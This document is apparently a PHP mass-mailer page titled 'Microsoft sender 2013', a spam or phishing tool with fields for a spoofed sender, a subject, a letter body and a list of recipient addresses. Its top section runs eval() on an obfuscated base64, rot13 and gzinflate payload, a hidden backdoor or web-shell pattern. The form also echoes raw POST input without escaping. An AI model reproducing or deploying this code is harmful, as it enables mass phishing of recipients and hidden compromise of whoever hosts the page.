<?php 
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);

$text = "3UhEYts4DH4fsP+gCRnsoo0Tuy2WJmnQeM/NigO6m2orY1YLUDYkp+umJleiqz3cfx8pOXbSJev7gkC2yY8UKX6k9JxyXKVwoWsqHzJeuHu916+EKtJPSiotaKULt42y2ZhaCp0xotidlnmauXvfX793R28e+aBhWdXIvyURdqTndBeDkTNIzi3KTEk906DE6qQQcElxm+pNdRGVb0/OSLUJTFe3blHBaC5XKRZXuOs6WaKhKqlYsebKCqwj+x6AaURHpcjVUctlspAcHD2DG3S55BLA6j4vs6ll6Q2jB6T2bwAsXe03ySAp15gYlbgzTlwk8XISjxz7Wf+4GiZoLHlaQlNBnPz5PrkYpO/jeAtr7GcAZLplTj8PBud2nHxX4iSmBjIbl+WYlwCjlGvEmGuEhg+8H+b9xITWNV+D5K/BSJxcEZ59EdExUVuKyGK3+9RbnopUw9YS1g9buWTB5orB+XX5spu1V/zkim+0akWv1QW+WZ5tU1xHIdlzGYcPIHTU7hF8kpCszthX9vcRdYwQF7UNVhdXQRXHMtDh9TB2XsIHQ7lYfK99w6F5vTWQB6i/M0koSTSLr7nqkk/dFy2kUY8YNoBwLbJzp2Z80vS32n/iTNUllvvYIrckxAYxr/2tFrEqxpw1z3Kx6GEDt02Ypdu4F19YyYFzRcBFShjed1/Irf9/j4yhspjy/r6dLqLQLFCCYAuNsLppvIwrH6QcJpILWYPfwYn57dXaYLcWtlCNHRopSmwpJ9DGYkT4FlsZncNwUl0T4IumwdI2QFsL/KWRIbAxqtN8c3QmLgczWIEn0GV+mriejDbpYJrBusBzQ5NSU1wnnE7BsU4zHtE5SorRvuOR+tCJ5zTxeGzsnlDaj2LCFhr1sdUdUDSiV6HIDqdcWl9jGbnPPYpFqdz1eBav/g2dUPZmBQy9ZnacDM8GVm318XBZzfljbGdRSXI+ayqwGD/8aoJwkl4oNtUE/NDVoFQxl48yl49P+4eHp2aUbZOsMpgZEDqqdv1iNidQQypB/vlPwg/Xw7PTYOgNLu3kklTHG8P8p0z98GETYFP1dJhmST3zgy0X5zf/Y+ulbO8f7botC/9r9y1s2N5k7UiB2V7nHq07D2vU6bzD7SkmasMwA0shQ0shMEshDEtuVEvBN65OgNaWpHMDIKItgeUm+sShBXS61/sB";

eval(str_rot13(gzinflate(str_rot13(base64_decode(($text))))));
?><title> Microsoft sender 2013 </title>
<style type="text/css">
<!--
.style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
.style6 {font-size: 10px}
.style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }
-->
</style>
<body bgcolor="#000000" style="text-align: center">

<form id="form1" name="form1" method="post" action="">
<input type="hidden" name="vai" value="1">
<span class="style5"><? echo enviando(); ?></span>
<p align="center">
<img src="http://www.journaldugeek.com/files/2012/02/spiderman-amazing.jpg" width="372" height="118"></p>
<p align="center"><b>
<font color="#FFFF00" face="Comic Sans MS" style="font-size: 20pt">
Microsoft sender 2013</font></b></p>
<table width="422" border="0" bgcolor="#000000">
  <tr>
<td width="66">
<p align="center"><span class="style5">Nome:</span></td>
<td width="346">
<p align="center"><span class="style9">

<label>
<input name="nome" value="<? echo $_POST['nome'] ;?>" size="20" style="float: left; background-color: #FFFF00" />
</label>
</span></td>
</tr>
<tr>
<td>
<p align="center"><span class="style5">Email:</span></td>
<td>
<p align="center">
<input name="de" value="<? echo $_POST['de'] ;?>" size="30" style="float: left; background-color: #FFFF00" /></td>

</tr>
<tr>
<td>
<p align="center"><span class="style5">Sujet:</span></td>
<td>
<p align="center">
<input name="assunto" value="<? echo $_POST['assunto'] ;?>" size="40" style="float: left; background-color: #FFFF00" /></td>
</tr>
<tr>
<td>
<p align="center"><span class="style5">Lettre:</span><p align="center">&nbsp;<p align="center">&nbsp;<p align="center">
<span class="style5">liste email</span></td>
<td><span class="style9">

<p align="center">
<textarea name="mensagem" cols="89" rows="7" style="background-color: #FFFF00"><? echo stripslashes($_POST['mensagem']);?>
</textarea></p>
<p align="left">
<textarea name="emails" cols="88" rows="7" style="background-color: #FFFF00"></textarea>
</span></td>
</tr>

<tr>
  <td>
	<p align="center"><span class="style6"></span></td>
  <td>
	<p align="center">
	<input name="Submit" type="submit" value="Inbox" style="color: #000080; font-weight: bold" /></td>
</tr>
</table>
</form>
